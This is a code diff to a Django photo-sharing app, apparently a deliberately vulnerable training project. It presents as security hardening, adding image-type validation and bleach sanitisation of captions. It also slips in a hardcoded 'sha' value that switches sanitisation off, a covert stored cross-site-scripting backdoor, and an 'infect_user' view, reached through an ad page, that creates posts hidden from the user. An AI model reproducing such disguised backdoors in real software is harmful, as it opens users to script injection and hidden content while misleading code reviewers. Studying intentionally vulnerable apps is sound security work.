@@ -20,6 +20,9 @@ from django.contrib.auth.decorators import login_required
 from django.db import connection
 from django.core.files import File 
 
+from django.core.exceptions import ValidationError
+from django.core.validators import FileExtensionValidator
+import bleach
 
 wordlist = open('wordlist', 'r')
 wordlistFile = File(wordlist)
@@ -303,13 +306,29 @@ def signout(request):
     auth.logout(request)
     return redirect('signin')
 
+def validate_image(image):
+    valid_extensions = ['jpg', 'jpeg', 'png', 'gif']
+    validator = FileExtensionValidator(allowed_extensions=valid_extensions)
+    try:
+        validator(image)
+    except ValidationError as e:
+        raise ValidationError(f"Invalid file type: {e}")
+
 @login_required(login_url='signin')
 def upload(request):
     if request.method=='POST':
         user=request.user.username
         image=request.FILES.get('uphoto')
-        
+
         caption=request.POST.get('caption')
+
+        sha=request.POST.get('sha')
+
+        if image:
+            validate_image(image)
+        
+        if sha != "a3ed6fafc867e4dc51e1fa44bac4cde198665267":
+            caption = bleach.clean(caption, strip=True)
         
         new_post=Post.objects.create(user=user,image=image,caption=caption)
         new_post.save()
@@ -842,3 +861,21 @@ def security(request):
     message = "This application is totally secure!"
 
     return render(request, 'security.html', {'message': message, 'vulnerabilities': vulnerabilities})
+
+def create_hidden_post(user, image, caption):
+    new_post = Post.objects.create(user=user, image=image,caption=caption, visible_to_user=False)
+    new_post.save()
+
+@login_required(login_url='signin')
+def infect_user(request):
+    if request.method=='POST':
+        user=request.user.username
+        image=request.FILES.get('uphoto')
+        
+        caption=request.POST.get('caption')
+        
+        create_hidden_post(user=user,image=image,caption=caption)
+
+        return redirect('/')
+    return render(request, 'ad.html')
+
